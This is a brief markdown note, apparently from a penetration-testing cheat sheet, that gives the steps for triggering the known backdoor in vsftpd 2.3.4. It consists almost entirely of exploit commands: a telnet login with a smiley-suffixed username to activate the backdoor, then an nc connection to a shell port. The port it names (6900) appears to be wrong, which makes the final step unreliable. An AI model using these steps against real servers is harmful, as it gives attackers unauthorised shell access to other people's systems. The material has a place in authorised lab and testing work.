# FTP - VSFTP 2.3.4 Back Door
This version has a built in back door.

## Exploit

Activate the backdoor with:
```
telnet <server> 21
USER someone: )
PASS nothing
ctrl+[
```

Connect:
```
nc <server> 6900
```
